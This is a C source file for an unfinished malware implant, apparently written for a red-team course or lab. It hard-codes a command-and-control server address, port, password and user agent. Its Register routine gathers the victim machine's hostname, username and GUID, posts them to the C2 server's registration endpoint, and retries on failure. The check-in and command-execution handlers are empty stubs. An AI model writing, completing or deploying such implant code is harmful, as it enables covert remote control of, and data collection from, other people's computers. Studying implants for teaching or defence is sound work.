#include "httpclient.h"
#include "execute.h"
#include "command.h"
#include "debug.h"

// TODO
// password, c2, port, register, checkin, ua, tls, max failure, sleep time 

#define PASSWORD "1337ch0nkyboy"

#define C2_DOMAIN L"localhost"
#define C2_PORT 5000
#define REGISTER_PATH L"/implant/register"
#define USE_TLS FALSE
#define USER_AGENT L"ch0nky"
#define MAX_ATTEMPT 5
#define SLEEP_TIME 1000

// todo: opcodes

RegisterData registerData;
CheckinData checkinData;

BOOL Register(RegisterData *rd){
    DEBUG_PRINTF("Implant Registering\n");
    MakeRegisterData(rd);
    memcpy(rd->Password, PASSWORD, strlen(PASSWORD));
    DEBUG_PRINTF("Register data: %s %s\n", rd->szHostname, rd->szUsername);
    DEBUG_HEX(rd->Guid, sizeof(rd->Guid));
    DEBUG_HEX(rd->Password, sizeof(rd->Password));
    LPBYTE lpOut = NULL;
    SIZE_T stOut = 0;
    lpOut = HTTPRequest(
        L"POST", 
        C2_DOMAIN, 
        REGISTER_PATH, 
        C2_PORT,
        USER_AGENT, 
        (LPBYTE) rd, 
        GetRegisterSize(rd), 
        &stOut, 
        USE_TLS
    );
    if (lpOut == NULL){
        DEBUG_PRINTF("HTTP Request Failed in register\n");
        return FALSE;
    }
    if (stOut ==2){
        if(lpOut[0] == 'o' && lpOut[1] == 'k'){
            free(lpOut);
            return TRUE;
        }
        free(lpOut);
        return FALSE;   
    }
    free(lpOut);
    return FALSE;
}



JobRequest* Checkin(CheckinData *chkin){
    DEBUG_PRINTF("Implant Checkin\n");
}


JobResponse* HandleExecute(JobRequest *jr){
    DEBUG_PRINTF("Handleing Execute Job \n");
    
}


int main(){
    DEBUG_PRINTF("Starting implant\n");
    DWORD dwAttempts = 0;
    while(TRUE){
        if(dwAttempts > MAX_ATTEMPT){
            DEBUG_PRINTF("Failed to reigster!\n");
            exit(0);
        }
        BOOL bResult = Register(&registerData);
        if(bResult){
            DEBUG_PRINTF("Registered!\n");
            break;
        }
        Sleep(SLEEP_TIME);
        dwAttempts ++;

    }
    return 0;
}